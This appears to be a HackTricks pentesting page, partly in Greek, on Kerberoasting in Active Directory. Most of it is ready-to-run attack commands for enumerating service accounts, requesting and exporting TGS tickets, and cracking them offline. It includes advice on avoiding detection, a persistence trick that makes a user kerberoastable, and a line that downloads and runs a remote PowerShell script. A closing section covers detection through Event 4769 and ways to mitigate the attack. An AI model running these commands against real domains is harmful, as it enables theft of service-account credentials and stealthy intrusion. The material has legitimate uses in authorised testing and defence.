# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση **TGS tickets**, συγκεκριμένα αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό **λογαριασμούς χρηστών** στο **Active Directory (AD)**, εξαιρώντας **λογαριασμούς υπολογιστών**. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από **κωδικούς πρόσβασης χρηστών**, επιτρέποντας την πιθανότητα **offline credential cracking**. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από μια μη κενή ιδιότητα **"ServicePrincipalName"**.

Για την εκτέλεση του **Kerberoasting**, είναι απαραίτητος ένας λογαριασμός τομέα ικανός να ζητήσει **TGS tickets**. Ωστόσο, αυτή η διαδικασία δεν απαιτεί **ειδικά προνόμια**, καθιστώντας την προσβάσιμη σε οποιονδήποτε έχει **έγκυρα διαπιστευτήρια τομέα**.

### Key Points:

- **Kerberoasting** στοχεύει **TGS tickets** για **υπηρεσίες λογαριασμού χρηστών** εντός του **AD**.
- Τα εισιτήρια που κρυπτογραφούνται με κλειδιά από **κωδικούς πρόσβασης χρηστών** μπορούν να **σπαστούν offline**.
- Μια υπηρεσία αναγνωρίζεται από μια **ServicePrincipalName** που δεν είναι κενή.
- **Δεν απαιτούνται ειδικά προνόμια**, μόνο **έγκυρα διαπιστευτήρια τομέα**.

### **Attack**

> [!WARNING]
> Τα **εργαλεία Kerberoasting** ζητούν συνήθως **`RC4 encryption`** κατά την εκτέλεση της επίθεσης και την εκκίνηση αιτημάτων TGS-REQ. Αυτό συμβαίνει επειδή **RC4 είναι** [**ασθενέστερο**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) και πιο εύκολο να σπάσει offline χρησιμοποιώντας εργαλεία όπως το Hashcat από άλλους αλγόριθμους κρυπτογράφησης όπως το AES-128 και το AES-256.\
> Οι κατακερματισμοί RC4 (τύπος 23) αρχίζουν με **`$krb5tgs$23$*`** ενώ οι AES-256 (τύπος 18) αρχίζουν με **`$krb5tgs$18$*`**.` 
> Επιπλέον, προσέξτε γιατί το `Rubeus.exe kerberoast` ζητάει αυτόματα εισιτήρια για ΟΛΟΥΣ τους ευάλωτους λογαριασμούς, κάτι που θα σας κάνει να εντοπιστείτε. Πρώτα, βρείτε τους χρήστες που είναι κατάλληλοι για kerberoast με ενδιαφέροντα προνόμια και στη συνέχεια εκτελέστε το μόνο σε αυτούς.
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Ο κωδικός πρόσβασης θα ζητηθεί
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Καταγραφή χρηστών που είναι διαθέσιμοι για kerberoast
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Εξαγωγή hashes
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Πάρτε τους χρήστες που μπορούν να Kerberoast
setspn.exe -Q */* #Αυτό είναι ένα ενσωματωμένο δυαδικό. Επικεντρωθείτε στους λογαριασμούς χρηστών
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
#Πάρτε TGS στη μνήμη από έναν μόνο χρήστη
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Παράδειγμα: MSSQLSvc/mgmt.domain.local

#Πάρτε TGS για ΟΛΟΥΣ τους λογαριασμούς που είναι επιδεκτικοί σε kerberoast (συμπεριλαμβανομένων των υπολογιστών, όχι και τόσο έξυπνο)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#Λίστα με τα εισιτήρια kerberos στη μνήμη
klist

# Εξαγωγή τους από τη μνήμη
Invoke-Mimikatz -Command '"kerberos::list /export"' #Εξαγωγή εισιτηρίων στον τρέχοντα φάκελο

# Μετατροπή του kirbi ticket σε john
python2.7 kirbi2john.py sqldev.kirbi
# Μετατροπή του john σε hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: Πάρε το Kerberoast hash ενός χρήστη
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Χρησιμοποιώντας PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Πάρε όλα τα Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Συγκεκριμένος χρήστης
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Πάρε τους διαχειριστές

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
